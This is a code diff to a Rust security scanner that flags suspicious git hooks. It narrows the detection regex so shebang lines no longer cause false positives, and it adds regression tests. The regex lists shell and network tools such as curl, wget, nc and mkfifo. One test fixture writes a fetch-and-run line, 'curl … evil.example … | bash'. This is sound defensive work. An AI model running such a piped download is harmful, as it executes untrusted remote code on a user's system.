@@ -31,8 +31,14 @@ static RE_CONSTRUCTOR_CHAIN: Lazy<Regex> =
 static RE_PHP_VAR_FUNC: Lazy<Regex> =
     Lazy::new(|| Regex::new(r#"\$\w+\s*=\s*['"](\w+)['"]"#).unwrap());
 
+// NOTE: bare `/bin/sh` / `/bin/bash` are intentionally NOT listed here. They
+// match the `#!/bin/bash` shebang every legitimate hook carries, producing a
+// CRITICAL false positive on normal hooks. The real injection vector is a hook
+// *feeding* a payload to a shell (`curl … | bash`), which the pipe-to-shell
+// alternatives (`\|\s*sh`, `\|\s*bash`) and downloader/interpreter tokens
+// already cover.
 static RE_GIT_HOOK_SUSPICIOUS: Lazy<Regex> = Lazy::new(|| {
-    Regex::new(r"(?i)(curl\s|wget\s|eval\s|base64|/bin/sh|/bin/bash|\|\s*sh|\|\s*bash|python\s+-c|node\s+-e|nc\s+-|ncat\s|mkfifo)").unwrap()
+    Regex::new(r"(?i)(curl\s|wget\s|eval\s|base64|\|\s*sh|\|\s*bash|python\s+-c|node\s+-e|nc\s+-|ncat\s|mkfifo)").unwrap()
 });
 
 /// Scan a single line for Tier 1 encoding/string manipulation patterns.
@@ -203,6 +209,11 @@ pub fn scan_git_hooks(target: &Path) -> Vec<AuditFinding> {
         let file_path_str = path.to_string_lossy().to_string();
 
         for (i, line) in content.lines().enumerate() {
+            // Skip the interpreter shebang (`#!/bin/bash`, `#!/usr/bin/env sh`).
+            // It is the expected first line of every hook and never an injection.
+            if i == 0 && line.starts_with("#!") {
+                continue;
+            }
             if RE_GIT_HOOK_SUSPICIOUS.is_match(line) {
                 findings.push(AuditFinding {
                     file_path: file_path_str.clone(),
@@ -414,5 +425,68 @@ mod tests {
 
         let findings = scan_git_hooks(dir.path());
         assert!(findings.is_empty());
+    }
+
+    /// REGRESSION: a normal Laravel-style pre-commit hook (shebang + linters)
+    /// must NOT trip the rule. The `#!/bin/bash` shebang previously matched the
+    /// bare `/bin/bash` token and produced a CRITICAL false positive.
+    #[test]
+    fn test_git_hook_benign_bash_not_flagged() {
+        let dir = tempfile::tempdir().unwrap();
+        let hooks_dir = dir.path().join(".git").join("hooks");
+        std::fs::create_dir_all(&hooks_dir).unwrap();
+
+        let hook_path = hooks_dir.join("pre-commit");
+        let mut f = std::fs::File::create(&hook_path).unwrap();
+        writeln!(f, "#!/bin/bash").unwrap();
+        writeln!(f, "echo 'Running pre-commit checks...'").unwrap();
+        writeln!(f, "./vendor/bin/pint --test").unwrap();
+        writeln!(f, "./vendor/bin/phpstan analyse --memory-limit=512M").unwrap();
+
+        let findings = scan_git_hooks(dir.path());
+        assert!(
+            findings.is_empty(),
+            "benign bash hook must not be flagged, got: {:?}",
+            findings
+                .iter()
+                .map(|f| (&f.rule_id, f.line_number))
+                .collect::<Vec<_>>()
+        );
+    }
+
+    /// A hook whose ENTIRE content is just the shebang must not flag.
+    #[test]
+    fn test_git_hook_shebang_only_not_flagged() {
+        let dir = tempfile::tempdir().unwrap();
+        let hooks_dir = dir.path().join(".git").join("hooks");
+        std::fs::create_dir_all(&hooks_dir).unwrap();
+
+        let hook_path = hooks_dir.join("pre-push");
+        let mut f = std::fs::File::create(&hook_path).unwrap();
+        writeln!(f, "#!/bin/bash").unwrap();
+
+        assert!(scan_git_hooks(dir.path()).is_empty());
+    }
+
+    /// A real injection payload (download piped to a shell) must STILL flag,
+    /// even though the bare shell-path tokens were removed from the regex.
+    #[test]
+    fn test_git_hook_curl_pipe_bash_still_flagged() {
+        let dir = tempfile::tempdir().unwrap();
+        let hooks_dir = dir.path().join(".git").join("hooks");
+        std::fs::create_dir_all(&hooks_dir).unwrap();
+
+        let hook_path = hooks_dir.join("post-merge");
+        let mut f = std::fs::File::create(&hook_path).unwrap();
+        writeln!(f, "#!/bin/bash").unwrap();
+        writeln!(f, "curl -s http://evil.example/x | bash").unwrap();
+
+        let findings = scan_git_hooks(dir.path());
+        let hit = findings
+            .iter()
+            .find(|f| f.rule_id == "obfuscation-git-hook-injection")
+            .expect("curl-pipe-bash payload must still be flagged");
+        // The payload is on line 2, not the shebang.
+        assert_eq!(hit.line_number, Some(2));
     }
 }
